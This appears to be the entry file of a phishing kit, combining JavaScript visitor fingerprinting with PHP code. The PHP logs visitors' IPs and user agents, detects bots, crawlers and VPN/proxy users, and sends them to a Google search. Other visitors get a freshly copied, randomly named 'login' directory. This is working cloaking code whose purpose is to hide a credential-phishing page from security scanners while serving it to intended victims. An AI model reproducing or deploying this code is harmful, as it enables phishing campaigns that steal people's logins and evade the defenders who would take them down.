
<html>
<head>
	<script src="login/session/resources/js/bot-detector.js"></script>
	<script src="login/session/resources/js/mobile-detect.js"></script>
</head>
<body>
	<script type="text/javascript">
		var botDetector = new BotDetector({timeout: 1000});
		var md = new MobileDetect(window.navigator.userAgent);
		if (md.mobile()){
			if(md.tablet()){
				document.cookie = "is_tablet=1";
			} else if(!md.tablet()){
				document.cookie = "is_tablet=0";
			}
			document.cookie = "is_mobile=1";
			if(md.phone()){
				document.cookie = "phone="+md.phone();
			} else if (!md.phone()){
				document.cookie = "phone=0";
			}
			if(md.os()){
				document.cookie = "os="+md.os();
			} else if(!md.os()){
				document.cookie = "os=0";
			}
		} else if(!md.mobile()){
			document.cookie = "is_mobile=0";
			document.cookie = "is_tablet=0";
			document.cookie = "phone=0";
			document.cookie = "os=0";
		}

		if (botDetector.isBot || md.is('bot')){
			document.cookie = "is_bot=1";
		} else if (! botDetector.isBot || ! md.is('bot')){
			document.cookie = "is_bot=0";
		} else {
			document.cookie = "is_bot=0";
		}
		var message = "";

		function clickIE() {
		    if (document.all) {
		        (message);
		        return false;
		    }
		}

		function clickNS(e) {
		    if (document.layers || (document.getElementById && !document.all)) {
		        if (e.which == 2 || e.which == 3) {
		            (message);
		            return false;
		        }
		    }
		}
		if (document.layers) {
		    document.captureEvents(Event.MOUSEDOWN);
		    document.onmousedown = clickNS;
		} else {
		    document.onmouseup = clickNS;
		    document.oncontextmenu = clickIE;
		}

		document.oncontextmenu = new Function("return false");
	</script>
</body>
</html>
<?php

# Including Files 

$settings = include('settings/settings.php');
include("login/Bots/fucker.php");
include("login/Bots/blacklister.php");
include("login/Bots/Anti/out/Crawler/src/CrawlerDetect.php");

# Variables 

$useragent = $_SERVER['HTTP_USER_AGENT'];
define(URL, "https://href.li/?https://www.google.com/search?q=".$settings['out']);

# Settings 

if($settings['debug'] == "1"){
	error_reporting(E_ALL);
	ini_set('display_errors', '1');
	ini_set('display_startup_errors', '1');
};

if($settings['log_user'] == "1"){
	
	# Log Client
	
	$date = date("h:i:s d/m/Y");
	$ip = get_client_ip();
	$useragent = $useragent;
	$logfile = fopen("Logs/logs.txt", "a");
	$logs = "[{$date}] CLIENT LOGGED *** {$ip} *** [{$useragent}]\n";
	fwrite($logfile, $logs);
	fclose($logfile);
}

if ($settings['proxy_block'] == "1") {

    # Check VPN | Proxy 

    $ip = get_client_ip();
    $url = "https://blackbox.ipinfo.app/lookup/" . $ip;
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    $resp = curl_exec($ch);
    curl_close($ch);

    if ($ip !== "127.0.0.1" && $resp == "Y" || $resp == "y") {
        $click = fopen("Logs/proxy-block.txt", "a");
        $message = $ip . "\n";
        $date = date("h:i:s d/m/Y");
        fwrite($click, "{$ip}|{$date}|VPN/Proxy" . "\n");
        fclose($click);
        echo("<script>window.location.href = \"".URL."\";</script>");
    }
}



if ($_COOKIE['is_bot'] == "1"){
	$browser = getBrowser($useragent);
	$os = getOS($useragent);
	$ip = get_client_ip();
	$date = date("h:i:s d/m/Y");
	$useragent = $useragent;
	$message = "+++++[ BOT - BotDetector ]+++++\n";
	$message .= "IP         : ".$ip."\n";
	$message .= "OS         : ".$os."\n";
	$message .= "Browser    : ".$browser."\n";
	$message .= "User-Agent : ".$useragent."\n";
	$message .= "+++++[ ######### ]+++++\n\n";
	$xy = fopen("./Logs/botlogs.txt", "a+");
	fwrite($xy, $message);
	fclose($xy);
	echo("<script>window.location.href = \"".URL."\";</script>");
}

# Main Check

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;
if ($CrawlerDetect->isCrawler($useragent)){
	$IP = get_client_ip();
	$country = $dataf['country'];
	$browser = getBrowser($useragent);
	$os = getOS($useragent);
	$ip = get_client_ip();
	$date = date("h:i:s d/m/Y");
	$useragent = $useragent;
	$message = "+++++[ BOT - CrawlerDetect ]+++++\n";
	$message .= "IP         : ".$ip."\n";
	$message .= "OS         : ".$os."\n";
	$message .= "Browser    : ".$browser."\n";
	$message .= "User-Agent : ".$useragent."\n";
	$message .= "+++++[ ######### ]+++++\n\n";
	$xy = fopen("./Logs/botlogs.txt", "a+");
	fwrite($xy, $message);
	fclose($xy);
	echo("<script>window.location.href = \"".URL."\";</script>");
} else {
	echo "<script>document.cookie = 'has_access=1';</script>";
	$DIR=md5(rand(0,100000000000));
	function recurse_copy($name,$DIR) {
		$dir = opendir($name);
		@mkdir($DIR, 0777);
		while(false !== ( $file = readdir($dir)) ) {
			if (( $file != '.' ) && ( $file != '..' )) {
				if ( is_dir($name . '/' . $file) ) {
					recurse_copy($name . '/' . $file,$DIR . '/' . $file);
				}	else {
					copy($name . '/' . $file,$DIR . '/' . $file);
				}
			}
		}
		closedir($dir);
	}
	
	# Client Number

	$o = file_get_contents("Logs/client.txt");
	$client = (int)$o + 1;
	$add = fopen('Logs/client.txt', 'r+');
	fwrite($add, $client);
	fclose($add);


	$name="login";
	recurse_copy( $name, $DIR );
	echo "<script>window.location.href = "."\"".$DIR."\"; </script>";
	$file = fopen("temp.txt","w");
	fwrite($file, $DIR);
}

# Functions 

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_X_CLUSTER_CLIENT_IP'))
    	$ipaddress = getenv('HTTP_X_CLUSTER_CLIENT_IP');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


function getOS($useragent) {
  $os_platform = "Unknown OS Platform";
  $os_array = array('/windows nt 10/i' => 'Windows 10','/windows nt 6.3/i' => 'Windows 8.1','/windows nt 6.2/i' => 'Windows 8','/windows nt 6.1/i' => 'Windows 7','/windows nt 6.0/i' => 'Windows Vista','/windows nt 5.2/i' => 'Windows Server 2003/XP x64','/windows nt 5.1/i' => 'Windows XP','/windows xp/i' => 'Windows XP','/windows nt 5.0/i' => 'Windows 2000','/windows me/i' => 'Windows ME','/win98/i' => 'Windows 98','/win95/i' => 'Windows 95','/win16/i' => 'Windows 3.11','/macintosh|mac os x/i' => 'Mac OS X','/mac_powerpc/i' => 'Mac OS 9','/linux/i' => 'Linux','/ubuntu/i' => 'Ubuntu','/iphone/i' => 'iPhone','/ipod/i' => 'iPod','/ipad/i' =>  'iPad','/android/i' => 'Android','/blackberry/i' =>  'BlackBerry','/webos/i' => 'Mobile');
  foreach ($os_array as $regex => $value) {
    if (preg_match($regex, $useragent)) {
      $os_platform = $value;
    }
  }
  return $os_platform;
}

function getBrowser($useragent) {
    $browser = "Unknown Browser";
    $browser_array = array('/msie/i' => 'Internet Explorer','/firefox/i' => 'Firefox','/safari/i' => 'Safari','/chrome/i' => 'Chrome','/opera/i' => 'Opera','/netscape/i' => 'Netscape','/maxthon/i' => 'Maxthon','/konqueror/i' => 'Konqueror','/mobile/i' => 'Handheld Browser');
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}


?>